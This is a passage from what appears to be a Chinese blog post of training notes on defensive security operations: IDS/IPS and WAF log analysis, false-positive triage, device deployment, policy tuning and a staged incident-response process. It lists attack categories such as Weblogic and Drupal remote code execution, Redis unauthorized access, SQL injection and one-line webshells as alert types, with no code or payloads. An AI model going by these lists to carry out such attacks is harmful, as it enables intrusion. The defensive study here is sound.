Search远程代码执行漏洞利用</li><li>Drupal远程代码执行漏洞利用</li><li>Weblogic远程代码执行漏洞利用</li><li>路由器漏洞利用&gt;利用Netcore路由器后门植入恶意程序</li></ul></li><li><p>恶意程序通信类</p><ul><li>连接C&amp;C服务器（通信），外部内部DNS请求解析恶意域名（DNS方向矫正与关联）</li></ul></li><li><p>敏感服务未授权访问</p><ul><li>Redis未授权访问远程获取服务器权限</li><li>Juniper NetScreenOS系统未授权登录后门</li></ul></li><li><p>暴力破解</p><ul><li><p>支持的登录验证方式</p><ul><li>form</li><li>Ajax</li><li>Jsonp</li></ul></li><li><p>策略配置检查</p><ul><li>无验证码无Referer检查</li><li>无验证码有Referer检查</li><li>有验证码无Referer检查</li><li>有验证码有Referer检查</li></ul><p>Referer：通常为数据提交页面</p><p>大于等于登录阈值，无论Referer是否有效都进行警告</p></li><li><p>在检测周期内判断访问次数是否达到访问阈值</p></li></ul></li></ul><h2 id="日志分析流程"><a class="markdownIt-Anchor" href="#日志分析流程"></a> 日志分析流程</h2><p><strong>绿盟IDS日志分析</strong></p><ol><li><p>首先我们拿到设备的IP，利用https://的方式远程登录到设备的管理界面。</p></li><li><p>选择到我们所需要查看的日志分析界面</p></li><li><p>根据你需要查看的日志时间，在上图的时间范围进行筛选。</p></li><li><p><strong>查询到所需要日志信息，导出报表</strong>。</p></li><li><p><strong>对报表里的数据进行筛选，选择需要具体查看的参数。</strong></p></li><li><p><strong>对时间进行分析，根据源IP、目的IP、访问的端口、持续次数和协议摘要进行判断，是否为不安全项，是否为攻击项</strong>。同时要熟悉IP网段所对应的区域，例如某个IP访问测试区的IP网段进行测试，产生的种种攻击行为都是正常的，因为是测试区，这时要对此数据进行加入白名单操作。</p></li><li><p>在报表中若是发现存在某些服务存在弱口令风险，查看其持续次数，并在协议摘要中查看其密码是否符合密码复杂性要求，不符合的话建立工单，联系相关负责人进行整改。</p></li><li><p>日志报表功能中的统计报表，可以清楚地看出每天的源地址TOP10,目的地址TOP10以及事件TOP10。</p></li><li><p>定期对漏洞特征库进行更新，根据设备的版本寻找升级包</p></li><li><p>发现漏洞时，不仅要对目的IP进行分析还要对源IP分析是否为公司内部原因造成，比如MS_17010漏洞，确认存在时对源IP和目的IP进行同时扫描，确认攻击到底在何处发生</p></li><li><p><strong>自己初步判断是真实攻击还是误报，误报忽略。疑似真实攻击事件，自己先进行验证，如果自己无法解决，协调渗透测试或漏洞验证人员进行进一步核实</strong></p></li></ol><h2 id="深入分析日志详情"><a class="markdownIt-Anchor" href="#深入分析日志详情"></a> 深入分析日志详情</h2><h3 id="告警日志误报分析"><a class="markdownIt-Anchor" href="#告警日志误报分析"></a> 告警日志误报分析</h3><p><strong>误报：</strong> 检测系统将一个合法的行为判断为一个异常或入侵行为，误报太多会降低入侵检测的效率，而且会增加安全管理员的负担，因为安全管理员必须调查每一个被报警的事件</p><p><strong>误报场景：</strong></p><ul><li>检测系统告警触发阈值过低</li><li>应用开发不规范（没有遵守RFC规范）</li><li>数据特征触发告规则</li></ul><h3 id="告警日志关联分析"><a class="markdownIt-Anchor" href="#告警日志关联分析"></a> 告警日志关联分析</h3><ul><li>无用安全事件过滤<ul><li>关注与事件相关的高中危告警日志</li><li>剔除与事件无关的告警日志</li></ul></li><li>安全事件时间排序<ul><li>根据时间排序筛选出符合时间特征的日志</li></ul></li><li>重复安全事件归并<ul><li>针对同一类安全事件进行归并分析，判断攻击的时间段、IP分布等</li></ul></li><li>源IP聚合<ul><li>源IP聚合，发现特定IP产生多种告警，判定存在漏洞扫描以及定向攻击行为</li><li>查看该IP产生的告警事件的<mark>时间分布</mark>，发现攻击的近期的告警数量、告警种类，如果随后几天告警数量急剧下降，判断可能先进行了漏洞扫描，随后进行了手工渗透攻击</li></ul></li></ul><h3 id="常见问题及处理方法"><a class="markdownIt-Anchor" href="#常见问题及处理方法"></a> 常见问题及处理方法</h3><ul><li>常见问题<ul><li>WAF只保存近期几天左右的日志信息，并随着时间覆盖之前的日志信息，告警日志分析只能分析近期时间段内告警日志</li><li>网络安全设备告警日志误报排查</li><li>大量日志分析</li></ul></li><li>处理方法问题<ul><li>告知客户日志分析的时间范围，建议使用专业的日志分析平台，保留日志</li><li>根据现场网络环境判断是否误报</li><li>使用平台，脚本以及Excel等工具进行日志分析</li></ul></li></ul><h2 id="安全事件统计分析"><a class="markdownIt-Anchor" href="#安全事件统计分析"></a> 安全事件统计分析</h2><h3 id="数据统计与分析工具"><a class="markdownIt-Anchor" href="#数据统计与分析工具"></a> 数据统计与分析工具</h3><p><strong>告警日志统计分析</strong>定义：通过统计聚合，加上人工分析判断，从总多告警日志记录发现事件、描述事件</p><p>统计工具：【TAM、WAF、IDS】（分析结果简单）、Excel</p><h3 id="关键信息分析统计"><a class="markdownIt-Anchor" href="#关键信息分析统计"></a> 关键信息分析统计</h3><ul><li><p>IDS/IPS日志</p><ul><li>时间，源ip，目的ip，目的端口，告警名称，告警次数，协议摘要，原始报文</li></ul></li><li><p>WAF日志</p><ul><li>时间，客户端IP，目标域名，URI（统一资源标识符），服务器IP，服务器端口，方法，事件类型，匹配规则，HTTP请求或响应信息</li></ul><p>利用这些可以侧写攻击者画像，展示业务系统受到攻击烈度、攻击手法，并做好处置预防工作</p></li><li><p>统计聚合的维度</p><ul><li>TOP N-&gt;最为常见，但对于安全人员做威胁分析没有太大价值<ul><li>事件TOP N</li><li>攻击源IP Top N</li><li>被攻击IP/域名 Top N</li></ul></li><li>时间分布-&gt;展现攻击时间变化趋势</li><li>告警类型-&gt;展现攻击手法</li><li>源IP-&gt;展现攻击IP的攻击烈度</li><li>源IP地理位置-&gt;展现各地区攻击烈度</li><li>业务系统-&gt;展现业务系统遭受的攻击烈度</li></ul><p>一般按照源IP、目的IP、时间、攻击类型四个维度来分析</p></li><li><p>重要事件的统计分析</p><ul><li>漏洞扫描探测<ul><li>攻击者使用漏洞扫描工具对目标系统进行web应用漏洞扫描、主机系统漏洞扫描，<mark>短时间</mark>内会在安全设备上产生<mark>多种类型</mark>的告警日志</li><li>端口扫描、探测等行为会被IDS告警</li></ul></li><li>恶意通信<ul><li>攻击者尝试访问webshell，上传木马后门等远程连接工具，或者被植入的恶意程序尝试连接远程地址，都会在安全设备上产生相应告警日志</li></ul></li><li>暴力猜解<ul><li>攻击者使用暴力猜解工具猜解登录用户名，密码，有大量认证失败的请求，会在安全设备上产生暴力猜解、认证失败的告警日志</li></ul></li></ul></li></ul><h3 id="分析结果整理与呈现"><a class="markdownIt-Anchor" href="#分析结果整理与呈现"></a> 分析结果整理与呈现</h3><ul><li>样例简报</li><li>样例报告</li></ul><h2 id="安全运维"><a class="markdownIt-Anchor" href="#安全运维"></a> 安全运维</h2><h3 id="服务目标"><a class="markdownIt-Anchor" href="#服务目标"></a> 服务目标</h3><ul><li>流程固化</li><li>运维指标化</li><li>技能规范化</li><li>强调事件管理</li><li>监控绩效化</li></ul><h3 id="工作分解"><a class="markdownIt-Anchor" href="#工作分解"></a> 工作分解</h3><ul><li>监控工作</li><li>其他工作</li><li>支持体系</li><li>成果文档</li><li>存储文档</li></ul><h3 id="运维交付"><a class="markdownIt-Anchor" href="#运维交付"></a> 运维交付</h3><ul><li>监控工作<ul><li>日常监控</li><li>设备异常</li><li>告警事件</li><li>工作报表</li></ul></li><li>其他工作<ul><li>配置变更</li><li>配置备份</li><li>设备升级</li></ul></li><li>支持文档<ul><li>客户资料</li><li>会议纪要</li><li>操作流程</li><li>整合管理</li></ul></li><li>成果文档<ul><li>01、日报周报</li><li>02、事件文档</li><li>…</li><li>99、设备相关</li></ul></li><li>存储文档</li><li>临时文件</li></ul><h3 id="意见建议"><a class="markdownIt-Anchor" href="#意见建议"></a> 意见建议</h3><ul><li>监控梳理<ul><li>运维-日常监控-策略调整-定期扫描</li><li>支撑<ul><li>配置现状-配置变更记录-辅助配置文件【配置管理】</li><li>固化流程-技能识别与规范化【操作流程】</li><li>事件跟踪表-定期复核 触发更新-监控确认机制【整合管理】</li></ul></li></ul></li><li>设备异常处理<ul><li>监控指标异常-&gt;参考“设备已知异常场景”处理-&gt;截图并记录-&gt;通告公司安全管理人员-&gt;联系第三方厂商支持</li></ul></li><li>异常告警事件处理<ul><li>异常告警事件-&gt;参考&quot;异常告警事件场景&quot;处理-&gt;截图并记录-&gt;通告公司安全管理人员-&gt;联系后台与二线支持</li></ul></li></ul><h3 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项"></a> 注意事项</h3><ul><li><p>作为项目的现场接口人，及时与用户对项目相关事宜进行协调；</p></li><li><p>及时与客户对运维保障项目内容进行沟通，提出在运维过程中发现的问题；</p></li><li><p>制定并执行漏洞扫描计划，向项目负责人提交漏洞扫描报告及漏洞解决方案；</p></li><li><p>制定并执行安全系统检查计划，监督每日重要系统检查和每月系统全面巡检，在重要保障时刻组织重点系统检查；</p></li><li><p>向项目负责人定期提交运行维护报告，对运行维护工作进行总结；</p></li><li><p>定期对安全运维工作进行总结，并形成相应的周报、月报提交项目相关人员；</p></li><li><p>制定并执行安全设备升级计划，定期对需要升级的安全设备进行新版本更新，保证安全设备的版本、事件库、病毒库保持最新；</p></li><li><p>制定并执行安全设备配置检查计划，定期对安全设备配置进行检测并进行相应备份，保证安全设备配置的正确性与高可用性；</p></li><li><p>定期信息安全漏洞跟踪，根据后台技术人员收集并提供的信息安全漏洞进行整理，形成针对客户的漏洞跟踪报告，为客户系统安全加固做参考；</p></li><li><p>负责计划和组织网络安全系统的调整与优化，例如：配置和资产的月度更新、容灾切换演练的配合、安全设备配置的调整、安全设备策略的优化等；</p></li><li><p>配合网络安全统相关的工程建设项目，例如：集中监控系统、NAS网络文件系统、内网容灾系统等；</p></li><li><p>制定日常运行维护计划，组织并跟踪例行任务的执行，向项目负责人通报结果；</p></li><li><p>收集在项目运维过程中客户或运维团队遇到的问题，并将相应问题及时向项目经理汇报，由项目经理协调相关资源就相关问题进行讨论和解决，保证项目质量。</p></li></ul><p><strong>设备运行状态监控</strong></p><p>安全设备运行实时情况监控，例如：CPU、内存占用率，硬盘占用情况，接口流量收发情况等系统运行基本参数监控</p><p><strong>安全设备日常监控</strong></p><p>安全设备运行实时情况监控，例如：CPU、内存占用率，硬盘占用情况，接口流量收发情况等系统运行基本参数监控</p><p><strong>安全设备策略调整</strong></p><p>在跨区域访问时，配合应用对防火墙进行策略调整或优化及检查。定期对防火墙策略进行过期检查停用。对于双中心所有安全设备均采用手工同步策略的方式进行策略同步。</p><p><strong>安全设备系统升级</strong></p><p>根据厂家发布的产品升级信息，每月一次对网络安全设备入侵检测，防毒墙，漏洞扫描器，木马检查及Websense的黑名单进行升级，保持网络安全系统的软件处于最新状态。</p><p>每周对安全设备进行策略配置相关的备份，总体目标保持备份策略的新鲜性。</p><p><strong>安全设备定期巡检</strong></p><p>每周对客户的安全设备进行一次巡检，安全设备巡检主要内容为检查安全设备的运行状况，包括CPU、内存占有率，接口工作状态等。</p><p>在巡检工作完成后出具巡检报告，对巡检过程中发现的重大问题及时上报相关人员，一般问题将会记录在巡检报告，并提醒相关人员注意。</p><p><strong>信息系统漏洞扫描</strong></p><p>每月对业务系统进行漏洞扫描和预警。对信息资产所面临的威胁、存在的弱点及对当前网络和系统中可能危及信息系统安全的事件或因素，进行详细的记录。并出具漏洞扫描报告。提供针对性的方案，使危害或损失降低到最低程度，保障信息系统的安全。</p><p><strong>安全事件协助处理</strong></p><p>按照绿盟科技的安全事件管理体系，在安全事件产生时，值守人员能及时的发现告警，判断事件类型。做好事件记录和取证。同时将分析结果提交后台技术支持分析。根据分析结果处理安全事件。并给出安全事件的处理报告，提交项目负责人审核。</p><h3 id="团队职责"><a class="markdownIt-Anchor" href="#团队职责"></a> 团队职责</h3><p><strong>安全专家团队工作职责</strong></p><ul><li><p>安全设备日志统计分析。</p></li><li><p>依据日志统计分析结果，发现存在的安全问题，并输出分析报告和解决建议。</p></li><li><p>为客户相关人员提供日常咨询服务。</p></li></ul><p><strong>应急响应支持团队工作职责</strong></p><ul><li><p>为客户提供7X24小时信息安全事件应急响应服务。</p></li><li><p>在接到客户应急响应需求时，保证1个小时之内到达现场。</p></li><li><p>应急响应完毕后提交应急响应报告。</p></li></ul><p><strong>信息安全培训团队工作职责</strong></p><ul><li><p>细心了解客户需求。</p></li><li><p>认真准备培训课件。</p></li><li><p>定期为客户提供高质量的信息安全培训。</p></li></ul><p><strong>信息安全通告团队工作职责</strong></p><ul><li><p>定期关注国家和行业信息安全动态。</p></li><li><p>及时准确的掌握了解最新漏洞信息。</p></li><li><p>定期向用户发送高质量的信息安全通告。</p></li></ul><p><strong>现场运维团队</strong></p><ul><li><p>运维工作日常沟通</p></li><li><p>安全设备日常监控</p></li><li><p>安全设备定期巡检</p></li><li><p>安全设备策略调整</p></li><li><p>安全设备系统升级</p></li><li><p>信息系统漏洞扫描</p></li><li><p>安全运维资料管理</p></li><li><p>安全事件协助处理</p></li></ul><h1 id="ips分析"><a class="markdownIt-Anchor" href="#ips分析"></a> IPS分析</h1><h2 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h2><ul><li><p>入侵检测工作流程</p><ul><li>从<mark>主机</mark>和<mark>网络</mark>进行<mark>数据采集</mark>，进行<mark>检测分析</mark>，最后判断是否进行<mark>报警响应</mark></li></ul></li><li><p>NIPS体系架构</p><ul><li><p>高性能多核硬件平台</p></li><li><p>数通引擎（1-4层）</p><ul><li>ip碎片重组</li><li>流汇聚</li><li>TCP状态跟踪</li><li>数据捕获</li></ul></li><li><p>安全引擎（5-7层）</p><ul><li>协议识别</li><li>协议分析</li><li>协议检测</li></ul></li><li><p>安全响应模块</p><ul><li>包丢弃</li><li>会话阻断</li><li>记录日志</li><li>报警显示</li><li>邮件报警</li><li>协议回放</li><li>互动接口</li><li>自定义命令</li></ul></li><li><p>管理模块</p><ul><li>账号管理</li><li>配置管理</li><li>策略管理</li><li>事件管理</li><li>日志管理</li><li>系统监控</li></ul><p>入侵防护-抗DOS攻击-数据泄露防护-高级威胁防御-信誉-URL过滤-防病毒-用户管理-应用管理-流量控制（对流量控制进行<mark>攻击特征库</mark>匹配，<mark>信誉库</mark>匹配，<mark>URL分类库</mark>匹配）</p></li></ul></li><li><p>检测引擎</p><ul><li>协议分析<ul><li>检测机制<ul><li>基于特征匹配</li><li>基于统计分析</li></ul></li></ul></li></ul></li></ul><h2 id="部署方式"><a class="markdownIt-Anchor" href="#部署方式"></a> 部署方式</h2><ul><li>直通部署<ul><li>数据准备<ul><li>带外管理口地址和网关地址</li></ul></li><li>配置思路<ul><li>安全区配置</li><li>虚拟线配置</li><li>应用配置，使配置生效</li></ul></li></ul></li><li>旁路部署<ul><li>数据准备<ul><li>带外管理口地址和网关地址</li></ul></li><li>配置思路<ul><li>安全区配置</li><li>接口配置</li><li>应用配置，使配置生效</li></ul></li></ul></li><li>双机部署-虚拟线<ul><li>数据准备<ul><li>带外管理口地址和网关地址</li></ul></li><li>配置思路<ul><li>安全区配置</li><li>虚拟线及HA配置</li><li>应用配置，使配置生效</li></ul></li></ul></li><li>双机部署-非对称路由<ul><li>数据准备<ul><li>带外管理口地址和网关地址</li></ul></li><li>配置思路<ul><li>安全区配置</li><li>虚拟线及HA配置</li><li>应用配置，使配置生效</li></ul></li></ul></li></ul><h2 id="策略配置及优化"><a class="markdownIt-Anchor" href="#策略配置及优化"></a> 策略配置及优化</h2><p><strong>策略配置</strong></p><ul><li>根据虚拟线的安全区建立入侵防护策略，也可以建立全局策略匹配所有安全区。由于虚拟线<mark>不区分安全区流量往返方向</mark>，所以一组虚拟线划分在一个安全区即可</li><li>如果一组虚拟线两个接口配置了不同的安全区，分别建立两个方向的策略对进出流量进行检测，其实都是<mark>双向检测</mark>。</li><li>策略匹配<ul><li>数据流，先匹配自身将要经过的安全区和策略的安全区，如果命中在匹配策略的源和目的地址，进而再匹配规则</li><li>数据流会按照策略的优先级依次进行匹配，并且<mark>遍历完所有</mark>策略，遍历完之后如果所有命中执行动作为放行那么数据包会放行，如果有一个命中执行为阻断，数据包就会被阻断。</li></ul></li><li>策略优化<ul><li>why<ul><li>大量的低风险事件，不关注事件，误报事件掩盖了真正的攻击事件</li><li>日志分析时，用户无法从大量的告警信息中，找出真正的攻击事件，处理低风险事件浪费大量时间</li></ul></li><li>what<ul><li>PLAN<ul><li>客户检测需求分析</li><li>现有事件分析</li></ul></li><li>DO<ul><li>调整策略，去掉不关注事件</li></ul></li><li>CHECK<ul><li>试运行一段时间，在进行事件分析，找出无关事件、误报事件</li></ul></li><li>ACTION<ul><li>去掉（改进）误报事件</li><li>IDS/IPS策略逐步完善</li></ul></li></ul></li><li>how<ul><li>找出不关注安全事件</li><li>屏蔽不关注事件</li></ul></li></ul></li></ul><h2 id="日志分析"><a class="markdownIt-Anchor" href="#日志分析"></a> 日志分析</h2><ul><li><strong>日志分类</strong><ul><li>审计日志<ul><li>设备登录记录</li><li>设备操作记录</li></ul></li><li>运维日志<ul><li>认证日志</li><li>硬件日志</li><li>运行日志</li></ul></li><li>上网行为<ul><li>URL分类</li><li>应用管理</li></ul></li><li>安全日志<ul><li>入侵防护、信誉</li><li>数据防泄漏</li><li>防病毒</li></ul></li></ul></li><li><strong>日志归并</strong></li></ul><h1 id="waf分析"><a class="markdownIt-Anchor" href="#waf分析"></a> WAF分析</h1><h2 id="部署方式及工作原理"><a class="markdownIt-Anchor" href="#部署方式及工作原理"></a> 部署方式及工作原理</h2><ul><li>透明部署<ul><li>应用场景<ul><li>不改变原有网络拓扑</li><li>不增加网络设备接口</li><li>WAF关机不影响服务器的访问</li></ul></li></ul></li><li>多路串联部署<ul><li>选择正确的接口，创建多个工作组</li></ul></li><li>半透明部署<ul><li>牵引<ul><li>静态路由牵引</li></ul></li><li>回注<ul><li>二层回注</li><li>跨接回注</li><li>PBR回注</li></ul></li></ul></li><li>不透明部署<ul><li>应用场景<ul><li>不希望吧WEB服务器暴露在公网</li></ul></li><li>特点<ul><li>客户端与服务器互相均不可见</li><li>只转发代理策略匹配的HTTP流量</li></ul></li></ul></li><li>镜像监听<ul><li>应用场景<ul><li>只需要检测是否被攻击</li><li>不需要防护</li></ul></li></ul></li></ul><table><thead><tr><th style="text-align:center">部署方式\区别</th><th style="text-align:center">优势</th><th style="text-align:center">劣势</th></tr></thead><tbody><tr><td style="text-align:center">串联部署</td><td style="text-align:center">部署简单，不需要客户网络做较大改变</td><td style="text-align:center">WAF设备自身出现的问题可能会影响客户网络。所有流量都会经过WAF，增大了WAF的负载</td></tr><tr><td style="text-align:center">旁路部署</td><td style="text-align:center">系统资源利用率高，无需转发非WEB服务器的流量，无网络单点故障</td><td style="text-align:center">部署复杂，需要配置二层或三层流量牵引</td></tr><tr><td style="text-align:center">反向代理部署</td><td style="text-align:center">部署简单，系统资源利用率高，无需处理费HTTP流量，无网络单点故障</td><td style="text-align:center">对客户的业务逻辑影响较大，需要更换对外业务IP或服务器IP及DNS解析。客户端与服务器端通信不透明</td></tr><tr><td style="text-align:center">镜像监听</td><td style="text-align:center">无需改变客户网络拓扑，不影响客户业务运行，吞吐量大</td><td style="text-align:center">只能检测服务是否被攻击，不能对客户的业务安全进行防护</td></tr></tbody></table><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201126124016289.png" alt="image-20201126124016289" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201126124026219.png" alt="" /></p><h2 id="日志分析-2"><a class="markdownIt-Anchor" href="#日志分析-2"></a> 日志分析</h2><h3 id="常见web攻击"><a class="markdownIt-Anchor" href="#常见web攻击"></a> 常见web攻击</h3><ul><li>SQL注入，跨站脚本攻击（XSS），远程文件包含，命令注入，文件非法上传，暴力破解等<ul><li>规则描述<ul><li>查看WAF的规则描述，了解攻击常见关键字</li></ul></li><li>看书<ul><li>《HTTP权威指南》、《web安全深度剖析》、《白帽子讲web安全》</li></ul></li><li>实验<ul><li>绿盟实训平台、Webgoat、DVWA、OWASP</li></ul></li></ul></li><li>xss</li><li>sql注入</li><li>路径穿越</li><li>php一句话木马</li><li>asp一句话木马</li><li>jsp一句话木马</li></ul><h3 id="筛选过滤"><a class="markdownIt-Anchor" href="#筛选过滤"></a> 筛选过滤</h3><ul><li>通过协议过滤</li><li>通过URI过滤</li><li>通过告警类型过滤</li></ul><h2 id="策略调优"><a class="markdownIt-Anchor" href="#策略调优"></a> 策略调优</h2><ul><li>资产登记<ul><li>ip和端口</li><li>域名</li><li>开发语言</li><li>中间件类型</li><li>系统类型</li><li>数据库类型</li></ul></li><li>创建站点<ul><li>向导模式</li><li>补充策略</li><li>准确度高</li></ul></li><li>日志审计</li><li>规则调优<ul><li>日志分析</li><li>误报排除</li><li>添加例外</li></ul></li><li>开启阻断<ul><li>逐步开启</li></ul></li><li>试运行</li></ul><h2 id="应急处理"><a class="markdownIt-Anchor" href="#应急处理"></a> 应急处理</h2><ul><li>误报处理<ul><li>日志分析</li><li>加例外策略or调整对应防护规则</li><li>验证问题解决</li></ul></li><li>漏防处理<ul><li>攻击绕过？</li><li>确认攻击类型</li><li>调整策略勾选上对应规则</li><li>验证防护效果</li><li>防护成功</li><li>如果对于已有规则无法防护？新爆出漏洞？直接拨打客服热线跟技术支持确认</li></ul></li><li>业务受影响<ul><li>确认受影响规模<ul><li>处理方法：排除策略影响（空策略测试）</li><li>通过抓包等操作 -&gt; 确认停止站点防护测试，转发模式，bypass</li></ul></li></ul></li><li>界面报错</li><li>WAF自身故障<ul><li>可能原因：Apache异常，端口未启用</li><li>处理方法：第一时间检查是否影响业务；可尝试串口重启Apache</li></ul></li></ul><h1 id="安全事件闭环流程管理"><a class="markdownIt-Anchor" href="#安全事件闭环流程管理"></a> 安全事件闭环流程管理</h1><h2 id="什么是安全事件闭环管理"><a class="markdownIt-Anchor" href="#什么是安全事件闭环管理"></a> <mark>什么是</mark>安全事件闭环管理</h2><ul><li>定义<ul><li>为高效解决护网行动中遇到安全事件，所涉及到的闭环管理流程，包括<mark>事前准备、事件发现、事件报告、事件分析、事件处理、事件总结</mark></li></ul></li><li>目的<ul><li>结合实际护网场景，以最快的速度发现并处理安全事件，做好安全事件闭环流程管理</li></ul></li></ul><h2 id="怎么做安全事件闭环管理"><a class="markdownIt-Anchor" href="#怎么做安全事件闭环管理"></a> <mark>怎么做</mark>安全事件闭环管理</h2><h3 id="安全事件管理流程"><a class="markdownIt-Anchor" href="#安全事件管理流程"></a> 安全事件管理流程</h3><ol><li>准备</li><li>发现</li><li>报告</li><li>分析</li><li>处理</li><li>总结-&gt;准备</li></ol><p>形成一个闭环</p><h3 id="对事件进行分级"><a class="markdownIt-Anchor" href="#对事件进行分级"></a> 对事件进行分级</h3><table><thead><tr><th>序号</th><th>事件类型</th><th>事件等级</th></tr></thead><tbody><tr><td>1</td><td>扫描事件</td><td>4级事件</td></tr><tr><td>2</td><td>爆破事件</td><td>3级事件</td></tr><tr><td>3</td><td>钓鱼事件</td><td>3级事件</td></tr><tr><td>4</td><td>高危漏洞利用事件</td><td>2级事件</td></tr><tr><td>5</td><td>木马事件</td><td>1级事件</td></tr><tr><td>6</td><td>内网扫描事件</td><td>1级事件</td></tr><tr><td>7</td><td>内网爆破事件</td><td>1级事件</td></tr><tr><td>8</td><td>内网高危漏洞利用事件</td><td>1级事件</td></tr></tbody></table><h3 id="团队组建"><a class="markdownIt-Anchor" href="#团队组建"></a> 团队组建</h3><p>总指挥-支持保障小组-指挥决策小组-&gt;&gt;&gt;&gt;<sup>负责</sup>  所有阶段</p><ul><li>筹备阶段<ul><li>方案设计团队</li><li>资源准备团队</li></ul></li><li>检查阶段<ul><li>风险排查团队</li><li>安全加固团队</li></ul></li><li>演练阶段<ul><li>红方攻击团队</li><li>蓝方防御团队</li></ul></li><li>实战阶段<ul><li>安全监控团队</li><li>联络协同团队</li><li>应急处置团队</li><li>情报收集团队</li><li>事件上报团队</li></ul></li><li>总结阶段<ul><li>分析总结团队</li></ul></li></ul><p><strong>角色-职责</strong></p><ul><li>指挥决策<ul><li>1、协调监测组合处置组之间的工作</li><li>2、协调与客户业务人员及维护人员对接工作</li><li>3、每日整理日报及次日工作计划</li><li>4、组织开展总结复盘会议并把关总结报告文档</li></ul></li><li>监测团队<ul><li>1、分析所监测的设备及平台产生的安全日志，挖掘入侵事件，填写《入侵事件分析报告》提交给处置组</li><li>2、接受处置组的防护策略调整方案，并调整防护策略</li></ul></li><li>处置团队<ul><li>1、确认事件是否由正常业务引起，对真实攻击根据事件定级按次进行应急，完成后编写提交《应急处置报告》</li><li>2、防护调整策略输出到监测组，配合业务部门修补漏洞</li></ul></li></ul><h3 id="第一阶段-准备"><a class="markdownIt-Anchor" href="#第一阶段-准备"></a> 第一阶段-准备</h3><p>准备阶段是对应急响应事件发生而采用的技术和管理措施，人员，流程及工具</p><ol><li>应急响应管理-团队组建，事件定级，应急响应流程等</li><li>应急响应技术-安全防护/检测设备，备份恢复措施，应急响应工具包等</li><li>安全培训-为提高技术人员应急响应技能，熟悉应急预案而制定的安全培训</li></ol><h3 id="第二阶段-发现"><a class="markdownIt-Anchor" href="#第二阶段-发现"></a> 第二阶段-发现</h3><p>发现阶段确认是否有安全事件发生，及时评估造成的危害，影响范围，事件定级等，然后根据评估结果通知相关人员进入应急的流程</p><ol><li><p>事件确认</p><p>根据安全设备告警，用户反馈，异常现象等确认是否发生安全事件及事件类型</p></li><li><p>影响分析</p><p>确认事件影响范围，受影响系统，主机，事件定级</p></li></ol><h3 id="第三阶段-报告"><a class="markdownIt-Anchor" href="#第三阶段-报告"></a> 第三阶段-报告</h3><p>根据发现的异常现象或攻击告警，填写事件上报表，并发送相关团队</p><ol><li><p>事件上报</p><p>填写《事件上报表》，发送至指挥及事件处置团队</p></li><li><p>启动应急响应</p><p>按照应急响应管理制度及预案，启动应急响应流程</p></li></ol><p>《事件上报表》条目有–序号，事件类型，攻击源IP，攻击地理位置，攻击目标IP，目标系统，攻击次数，报警设备，上报人，攻击结果，攻击起始时间，攻击结束时间，处置结果</p><h3 id="第四阶段-分析"><a class="markdownIt-Anchor" href="#第四阶段-分析"></a> 第四阶段-分析</h3><p>主要任务是通过事件分析查明事件原因及危害，对攻击路径进行分析溯源</p><ol><li><p>入侵分析</p><p>通过对受影响的主机、网络进行详细排查，确认问题原因，常见排查内容包括：进程，端口，服务，注册表，账号，安全日志等</p></li><li><p>攻击溯源</p><p>根据入侵分析结果，确认是否可以定位攻击源，并进行进一步分析</p></li></ol><h3 id="第五阶段-处理"><a class="markdownIt-Anchor" href="#第五阶段-处理"></a> 第五阶段-处理</h3><p>主要任务是对确认的安全事件进行处置，降低事件影响、避免安全事件的扩散和安全事件对受害系统的持续性破坏</p><ol><li><p>遏制措施</p><p>通过安全设备对相关IP、端口、URL等进行访问控制、优化安全设备规则阻断如扫描、漏洞利用等攻击</p></li><li><p>根除措施</p><p>对相关漏洞进行修复，包括操作系统漏洞，应用漏洞等</p></li><li><p>恢复措施</p><p>木马后门清除，账户密码重置，服务端口恢复，重新部署应用等</p></li></ol><h3 id="第六阶段-总结"><a class="markdownIt-Anchor" href="#第六阶段-总结"></a> 第六阶段-总结</h3><p>对安全事件进行详细的总结和回顾，并出具报告，内容包括事件现象，发生时间，处理人员，处置过程，结论建议等</p><ol><li><p>事件总结</p><p>对整个安全事件处置过程进行详细记录和分析，出具《应急处置报告单》</p></li><li><p>事件上报</p><p>对指挥组进行事件上报</p></li></ol><h3 id="简略版本总结"><a class="markdownIt-Anchor" href="#简略版本总结"></a> 简略版本总结</h3><ul><li>发现<ul><li>日志分析</li><li>人员反馈</li><li>事件确认及影响</li><li>是否可以独立处置</li></ul></li><li>上报<ul><li>事件基本信息</li><li>处置建议</li><li>所需支持</li></ul></li><li>分析<ul><li>安全排查</li><li>攻击溯源</li></ul></li><li>处置<ul><li>木马后门清除</li><li>策略优化</li><li>漏洞修复</li></ul></li><li>总结<ul><li>处置过程</li><li>处置结果</li><li>安全建议</li></ul></li></ul><h3 id="四级事件处置流程"><a class="markdownIt-Anchor" href="#四级事件处置流程"></a> 四级事件处置流程</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201126145852643.png" alt="image-20201126145852643" /></p><h3 id="三级事件处置流程"><a class="markdownIt-Anchor" href="#三级事件处置流程"></a> 三级事件处置流程</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201126145907934.png" alt="image-20201126145907934" /></p><h3 id="二级事件处置流程"><a class="markdownIt-Anchor" href="#二级事件处置流程"></a> 二级事件处置流程</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201126145924486.png" alt="image-20201126145924486" /></p><h3 id="一级事件处置流程"><a class="markdownIt-Anchor" href="#一级事件处置流程"></a> 一级事件处置流程</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201126145948953.png" alt="image-20201126145948953" /></p><h3 id="安全事件处置流程"><a class="markdownIt-Anchor" href="#安全事件处置流程"></a> 安全事件处置流程</h3><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201126150017230.png" alt="image-20201126150017230" /></p><h3 id="常见问题分析"><a class="markdownIt-Anchor" href="#常见问题分析"></a> 常见问题分析</h3><h4 id="培训目的是什么"><a class="markdownIt-Anchor" href="#培训目的是什么"></a> 